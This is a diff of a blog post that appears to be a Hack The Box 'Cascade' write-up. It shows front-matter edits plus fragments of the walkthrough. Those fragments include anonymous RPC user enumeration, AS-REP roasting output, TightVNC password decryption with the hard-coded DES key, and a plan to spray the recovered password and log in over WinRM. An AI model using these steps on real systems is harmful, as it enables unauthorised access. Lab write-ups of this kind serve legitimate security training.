@@ -1,11 +1,11 @@
 ---
 layout: post
 title: HTB Machine - Cascade
-subtitle: 
-cover-img: /assets/img/Scifi.1920x1080.jpg
-thumbnail-img: /assets/img/Scifi.1920x1080.jpg
-share-img: /assets/img/Scifi.1920x1080.jpg
-tags: [ HTB, Active Directory, Hack the Box]
+subtitle: Writeup
+cover-img: https://www.hackthebox.com/storage/avatars/64fef851357b8de1c4834093bf3426f2.png
+thumbnail-img: https://www.hackthebox.com/storage/avatars/64fef851357b8de1c4834093bf3426f2.png
+share-img: https://www.hackthebox.com/storage/avatars/64fef851357b8de1c4834093bf3426f2.png
+tags: [ HTB, Active Directory, Hack the Box, Powershell,LDAP,.NET,SQLite,TightVNC,WinRM,RPC,Web,Network,Vulnerability Assessment,Active Directory,Protocols,Cryptography,Security Tools,Reversing,Authentication,SMB,DNSPY,.NET,Reconnaissance,User Enumeration,Password Reuse,Clear Text Credentials,Information Disclosure,Weak Cryptography,Hard-coded Credentials]
 ---
 
 ##### Enumerate smb and rpc. We found some users that we place in a file and then check if we can get a TGT. No luck. We check if there is any other info in the info of the users.
@@ -20,19 +20,19 @@ rpcclient -U '' 10.10.10.182 -N -c 'enumdomusers' |  grep -oP '\[.*?\]' | grep -
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User arksvc doesn\'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User s.smith doesn\'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User r.thompson doesn\'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User util doesn\'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.wakefield doesn\'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User s.hickson doesn\'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.goodhand doesn\'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User a.turnbull doesn\'t have UF_DONT_REQUIRE_PREAUTH set
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
-[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
-[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User d.burman doesn\'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User BackupSvc doesn\'t have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.allen doesn\'t have UF_DONT_REQUIRE_PREAUTH set
 [-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
 
 rpcclient -U '' 10.10.10.182 -N -c 'querydispinfo'
@@ -99,8 +99,7 @@ echo "6bcf2a4b6e5aca0f" | xxd -ps -r | xxd
 00000000: 6bcf 2a4b 6e5a ca0f                      k.*KnZ..
 
 echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv
-00000000  73 54 33 33 33 76 65 32                           |sT333ve2|
-00000008
+
 ```
 
 ##### we dont know for which user is the credential valid but we are going to use it against our list of users to find out. After finding it we can winrm to the machine and extract the first flag.  
